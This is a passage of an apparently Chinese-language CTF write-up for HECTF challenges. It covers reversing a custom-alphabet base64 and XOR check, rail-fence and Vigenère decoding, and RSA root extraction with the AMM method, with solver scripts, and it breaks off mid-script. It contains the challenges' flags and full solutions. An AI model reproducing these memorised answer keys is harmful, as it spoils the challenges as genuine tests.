class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">sub_1920</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+14h] [rbp-9Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+18h] [rbp-98h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-94h]</span></span><br><span class="line">  _WORD *v9; <span class="comment">// [rsp+20h] [rbp-90h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+28h] [rbp-88h]</span></span><br><span class="line">  _BYTE v11[<span class="number">44</span>]; <span class="comment">// [rsp+30h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+5Ch] [rbp-54h]</span></span><br><span class="line">  _QWORD v13[<span class="number">6</span>]; <span class="comment">// [rsp+60h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 v14; <span class="comment">// [rsp+90h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v15; <span class="comment">// [rsp+98h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v13, <span class="number">0</span>, <span class="built_in">sizeof</span>(v13));</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">63</span>; ++i )</span><br><span class="line">    *((_BYTE *)v13 + i) = dword_2040[i];</span><br><span class="line">  v10 = std::string::<span class="built_in">size</span>(a1);</span><br><span class="line">  v9 = (_WORD *)std::string::<span class="built_in">data</span>(a1);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v11, a2, v2);</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; (<span class="type">int</span>)(v10 / <span class="number">3</span>); ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)((<span class="type">char</span> *)&amp;v12 + <span class="number">1</span>) = *v9;</span><br><span class="line">    v3 = v9 + <span class="number">1</span>;</span><br><span class="line">    v9 = (_WORD *)((<span class="type">char</span> *)v9 + <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">HIBYTE</span>(v12) = *v3;</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (<span class="built_in">BYTE1</span>(v12) &gt;&gt; <span class="number">2</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(</span><br><span class="line">      v11,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (((<span class="type">unsigned</span> __int8)(<span class="number">16</span> * <span class="built_in">BYTE1</span>(v12)) | (<span class="built_in">BYTE2</span>(v12) &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0x3F</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(</span><br><span class="line">      v11,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (((<span class="type">unsigned</span> __int8)(<span class="number">4</span> * <span class="built_in">BYTE2</span>(v12)) | (<span class="built_in">HIBYTE</span>(v12) &gt;&gt; <span class="number">6</span>)) &amp; <span class="number">0x3F</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (<span class="built_in">HIBYTE</span>(v12) &amp; <span class="number">0x3F</span>)));</span><br><span class="line">    v6 += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">76</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      std::string::<span class="keyword">operator</span>+=(v11, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = v10 % <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">BYTE1</span>(v12) = *(_BYTE *)v9;</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (<span class="built_in">BYTE1</span>(v12) &gt;&gt; <span class="number">2</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + ((<span class="number">16</span> * <span class="built_in">BYTE1</span>(v12)) &amp; <span class="number">0x30</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, <span class="string">&quot;==&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v8 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)((<span class="type">char</span> *)&amp;v12 + <span class="number">1</span>) = *v9;</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (<span class="built_in">BYTE1</span>(v12) &gt;&gt; <span class="number">2</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(</span><br><span class="line">      v11,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + ((<span class="number">16</span> * <span class="built_in">BYTE1</span>(v12)) &amp; <span class="number">0x30</span> | (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="built_in">BYTE2</span>(v12) &gt;&gt; <span class="number">4</span>))));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + ((<span class="number">4</span> * <span class="built_in">BYTE2</span>(v12)) &amp; <span class="number">0x3C</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, <span class="string">&quot;=&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(a2, v11);</span><br><span class="line">  std::string::~<span class="built_in">string</span>();</span><br><span class="line">  <span class="keyword">return</span> v15 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这里就是典型的算法识别，实现的是一个 base64 加密，再就是这个函数，对 v6 进行了处理（我们输入的 flag 就是这个）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">sub_13A9</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// bl</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// bl</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-38h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = std::string::<span class="built_in">length</span>(a2);</span><br><span class="line">  v5 = std::string::<span class="built_in">length</span>(a1);</span><br><span class="line">  v8 = *(_QWORD *)<span class="built_in">sub_1DC2</span>(&amp;v5, &amp;v6);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; v8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = *(_BYTE *)std::string::<span class="keyword">operator</span>[](a1, i);</span><br><span class="line">    v3 = *(_BYTE *)std::string::<span class="keyword">operator</span>[](a2, i) ^ v2;</span><br><span class="line">    *(_BYTE *)std::string::<span class="keyword">operator</span>[](a1, i) = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v9 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​不过这个函数显而易见是用来干扰人的，这里对字符串异或之后存放的是第一个字符串地址，但 flag 是第二个参数，所以程序分析完了，其他的都不咋有用了，之后就是直接找数据，在最后那个异或函数里面存在一个数组 dword_4020 [j]，没有在函数中定义过，所以直接推测在全局变量里，双击跟进找到了，在 bss 段上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000004020 ; _DWORD dword_4020[64]</span><br><span class="line">.data:0000000000004020 dword_4020      dd 81, 67, 84, 67, 85, 66, 90, 118, 79, 70, 72, 115, 92</span><br><span class="line">.data:0000000000004020                                         ; DATA XREF: sub_17A7+F8↑o</span><br><span class="line">.data:0000000000004054                 dd 70, 125, 107, 78, 80, 85, 104, 81, 85, 125, 62, 69</span><br><span class="line">.data:0000000000004084                 dd 93, 67, 103, 69, 62, 59, 61, 71, 73, 83, 32, 84, 89</span><br><span class="line">.data:00000000000040B8                 dd 67, 96, 64, 95, 73, 126, 69, 56, 117, 56, 71, 124, 37</span><br><span class="line">.data:00000000000040EC                 dd 41, 90, 125, 89, 99, 95, 70, 87, 56, 95, 66, 121, 40</span><br></pre></td></tr></table></figure><p>​提取数据，然后写个脚本，根据异或算法写：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">  v6[i] = *(<span class="type">char</span> *)std::string::<span class="keyword">operator</span>[](a1, i) ^ (i / <span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>​exp 为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">compare</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> flag[])</span></span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> target[] = &#123;<span class="number">81</span>,<span class="number">67</span>,<span class="number">84</span>,<span class="number">67</span>,<span class="number">85</span>,<span class="number">66</span>,<span class="number">90</span>,<span class="number">118</span>,<span class="number">79</span>,<span class="number">70</span>,<span class="number">72</span>,<span class="number">115</span>,<span class="number">92</span>,<span class="number">70</span>,<span class="number">125</span>,<span class="number">107</span>,<span class="number">78</span>,<span class="number">80</span>,<span class="number">85</span>,<span class="number">104</span>,<span class="number">81</span>,<span class="number">85</span>,<span class="number">125</span>,<span class="number">62</span>,<span class="number">69</span>,<span class="number">93</span>,<span class="number">67</span>,<span class="number">103</span>,<span class="number">69</span>,<span class="number">62</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">83</span>,<span class="number">32</span>,<span class="number">84</span>,<span class="number">89</span>,<span class="number">67</span>,<span class="number">96</span>,<span class="number">64</span>,<span class="number">95</span>,<span class="number">73</span>,<span class="number">126</span>,<span class="number">69</span>,<span class="number">56</span>,<span class="number">117</span>,<span class="number">56</span>,<span class="number">71</span>,<span class="number">124</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">90</span>,<span class="number">125</span>,<span class="number">89</span>,<span class="number">99</span>,<span class="number">95</span>,<span class="number">70</span>,<span class="number">87</span>,<span class="number">56</span>,<span class="number">95</span>,<span class="number">66</span>,<span class="number">121</span>,<span class="number">40</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">compare</span>(target);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">compare</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> flag[])</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">64</span>;</span><br><span class="line">    <span class="type">char</span> f[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i)&#123;</span><br><span class="line">        f[i] = flag[i] ^ i / <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; len; ++i )&#123;</span><br><span class="line">        std::cout &lt;&lt; f[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//QCTBTCXtMEKpXBynKUSnWRz9MUKnL717MBX+XUOmMRGpK7z7Wl58KlKqMUD+KVm=</span></span><br></pre></td></tr></table></figure><p>​之后就是 base64 解密，不过这里出现了问题，base64 直接解密后发现有不可显示字符，并且再在之前没有任何关于操作 flag 的内容，并且 flag 应该是全是可显示的 <code>HECTF&#123;&#125;</code>  包起来的，所以应该是 base64 变表，找表。</p><p>​在之前的 base64 加密的那个函数里有个数组 <code>dword_2040[i]</code> ，跟进看看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000002040 ; _DWORD dword_2040[64]</span><br><span class="line">.rodata:0000000000002040 dword_2040      dd 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75</span><br><span class="line">.rodata:0000000000002040                                         ; DATA XREF: sub_1920+7F↑o</span><br><span class="line">.rodata:0000000000002074                 dd 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88</span><br><span class="line">.rodata:00000000000020A8                 dd 89, 90, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 43</span><br><span class="line">.rodata:00000000000020DC                 dd 47, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107</span><br><span class="line">.rodata:000000000000210C                 dd 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118</span><br><span class="line">.rodata:0000000000002138                 dd 119, 120</span><br></pre></td></tr></table></figure><p>​提取出来输出出来是：yzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwx</p><p>​所以，这个就是变了之后的表，拿着这个去解密，成功得到 flag：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;8c7d051e5a0e9c567c86fed492720cc8d3389af1&#125;</span><br></pre></td></tr></table></figure><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto">#</a> Crypto：</h2><h3 id="迷茫的艾米莉"><a class="markdownIt-Anchor" href="#迷茫的艾米莉">#</a> 迷茫的艾米莉</h3><p>Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c}{lr</p><p>key:  6</p><p P0fo2bb51lbbmew_0f_rczav9_jv="">YIUIT</p><p><span class="exturl" data-url="aHR0cHM6Ly9jeWJlcmNoZWYub3JnLyNyZWNpcGU9UmFpbF9GZW5jZV9DaXBoZXJfRW5jb2RlKDYsMC9kaXNhYmxlZClSYWlsX0ZlbmNlX0NpcGhlcl9EZWNvZGUoNiwwKQ==">Rail Fence Cipher Encode, 1 more - CyberChef</span></p><p>key:  responsibility</p><p C0ng2at51ations_0n_comin9_in="">HECTF</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cucXF4aXV6aS5jbi9iaWFubWEvd2VpamluaXlhbWltYS5waHA=">维吉尼亚密码在线加密解密 - 千千秀字 (qqxiuzi.cn)</span></p><h3 id="seven-more"><a class="markdownIt-Anchor" href="#seven-more">#</a> seven more</h3><p>e 和 phi 不互素的情况下和欧拉值也不互素 甚至现在 e 和 q 也不互素了</p><p>与传统 amm 不同的是 还要求出所有的 mq7</p><p>以下是解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">211174039496861685759253930135194075344490160159278597570478160714793843648384778026214533259531963057737358092962077790023796805017455012885781079402008604439036453706912819711606916173828620000813663524065796636039272173716362247511054616756763830945978879273812551204996912252317081836281439680223663883250992957309172746671265758427396929152878633033380299036765665530677963287445843653357154379447802151146728382517702550201</span></span><br><span class="line">c = <span class="number">191928992610587693825282781627928404831411364407297375816921425636703444790996279718679090695773598752804431891678976685083991392082287393228730341768083530729456781668626228660243400914135691435374881498580469432290771039798758412160073826112909167507868640830965603769520664582121780979767127925146139051005022993085473836213944491149411881673257628267851773377966008999511673741955131386600993547529438576918914852633139878066</span></span><br><span class="line">e = <span class="number">1009</span>*<span class="number">7</span></span><br><span class="line">p = <span class="number">31160882390461311665815471693453819123352546432384109928704874241292707178454748381602275005604671000436222741183159072136366212086549437801626015758789167455043851748560416003501637268653712148286072544482747238223</span></span><br><span class="line">q = <span class="number">6776895366785389188349778634427547683984792095011326393872759455291221057085426285502176493658280343252730331506803173791893339840460125807960788857396637337440004750209164671124188980183308151635629356496128717687</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">onemod</span>(<span class="params">e, q</span>):</span><br><span class="line">    p = random.randint(<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span>(powmod(p, (q-<span class="number">1</span>)//e, q) == <span class="number">1</span>):  <span class="comment"># (r,s)=1</span></span><br><span class="line">        p = random.randint(<span class="number">1</span>, q)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM_rth</span>(<span class="params">o, r, q</span>):  <span class="comment"># r|(q-1</span></span><br><span class="line">    <span class="keyword">assert</span>((q-<span class="number">1</span>) % r == <span class="number">0</span>)</span><br><span class="line">    p = onemod(r, q)</span><br><span class="line"></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = q-<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(s % r == <span class="number">0</span>):</span><br><span class="line">        s = s//r</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>((s*k+<span class="number">1</span>) % r != <span class="number">0</span>):</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alp = (s*k+<span class="number">1</span>)//r</span><br><span class="line"></span><br><span class="line">    a = powmod(p, r**(t-<span class="number">1</span>)*s, q)</span><br><span class="line">    b = powmod(o, r*a-<span class="number">1</span>, q)</span><br><span class="line">    c = powmod(p, s, q)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t-<span class="number">1</span>):</span><br><span class="line">        d = powmod(<span class="built_in">int</span>(b), r**(t-<span class="number">1</span>-i), q)</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = (-math.log(d, a)) % r</span><br><span class="line">        b = (b*(c**(r*j))) % q</span><br><span class="line">        h = (h*c**j) % q</span><br><span class="line">        c = (c*r) % q</span><br><span class="line">    result = (powmod(o, alp, q)*h)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM_Solution</span>(<span class="params">m, q, rt, cq, e</span>):</span><br><span class="line">    mp = []</span><br><span class="line">    <span class="keyword">for</span> pr <span class="keyword">in</span> rt:</span><br><span class="line">        r = (pr*m) % q</span><br><span class="line">        <span class="comment"># assert(pow(r, e, q) == cq)</span></span><br><span class="line">        mp.append(r)</span><br><span class="line">    <span class="keyword">return</span> mp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;HECTF&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CHECK2</span>(<span class="params">mp, mq, e, p, q</span>):</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    t1 = invert(q, p)</span><br><span class="line">    t2 = invert(p, q)</span><br><span class="line">    <span class="keyword">for</span> mp1 <span class="keyword">in</span> mp:</span><br><span class="line">        <span class="keyword">for</span> mq1 <span class="keyword">in</span> mq:</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> j % <span class="number">100000</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(j)</span><br><span class="line">            ans = (mp1*t1*q+mq1*t2*p) % (p*q)</span><br><span class="line">            <span class="keyword">if</span> check(ans):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM_ROOT</span>(<span class="params">r, q</span>):</span><br><span class="line">    li = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(li) &lt; r):</span><br><span class="line">        p = powmod(random.randint(<span class="number">1</span>, q-<span class="number">1</span>), (q-<span class="number">1</span>)//r, q)</span><br><span class="line">        li.add(p)</span><br><span class="line">    <span class="keyword">return</span> li</span><br><span class="line"></span><br><span class="line">cp = c % p</span><br><span class="line">cq = c % q</span><br><span class="line"></span><br><span class="line">mp = AMM_rth(cp, e, p)</span><br><span class="line">mq = AMM_rth(cq, <span class="number">1009</span>, q)</span><br><span class="line"></span><br><span class="line">rt1 = AMM_ROOT(e, p)</span><br><span class="line">rt2 = AMM_ROOT(<span class="number">1009</span>, q)</span><br><span class="line"></span><br><span class="line">ammp = AMM_Solution(mp, p, rt1, cp, e)</span><br><span class="line">ammq = AMM_Solution(mq, q, rt2, cq, <span class="number">1009</span>)</span><br><span class="line"></span><br><span class="line">d = invert(<span class="number">7</span>, q-<span class="number">1</span>)</span><br><span class="line">mqs = []</span><br><span class="line"><span class="keyword">for</span> mq <span class="keyword">in</span> ammq:</span><br><span class="line">    mqs.append(<span class="built_in">pow</span>(mq, d, q))</span><br><span class="line">ammq = mqs</span><br><span class="line">CHECK2(ammp, ammq, e, p, q)</span><br><span class="line"><span class="comment">##HECTF&#123;go0d_jOb_At_AmM&#125;</span></span><br></pre></td></tr></table></figure><h3 id="翻一翻"><a class="markdownIt-Anchor" href="#翻一翻">#</a> 翻一翻：</h3><p>爆破思路类似 RSA parity oracle。p,q 是 bit 翻转关系， 已知 p 最低的 k 位，则已知 q</p><p>最高的 k 位。假设已知 k 位的 p,q ，记为 ph,qh，利用不等式</p><p>ph ·qh.21024-2k &lt;=n&lt;(ph+1) ·(qh+ 1).21024-2k</p><p>逐位向低地址爆破，不断收缩不等式的范围，最终可求得 p，q 的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">404647938065363927581436797059920217726808592032894907516792959730610309231807721432452916075249512425255272010683662156287639951458857927130814934886426437345595825614662468173297926187946521587383884561536234303887166938763945988155320294755695229129209227291017751192918550531251138235455644646249817136993</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t</span>(<span class="params">a, b, k</span>):</span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">77</span>:</span><br><span class="line">        <span class="keyword">if</span> a*b == n:</span><br><span class="line">            <span class="built_in">print</span>(a, b)</span><br><span class="line">        <span 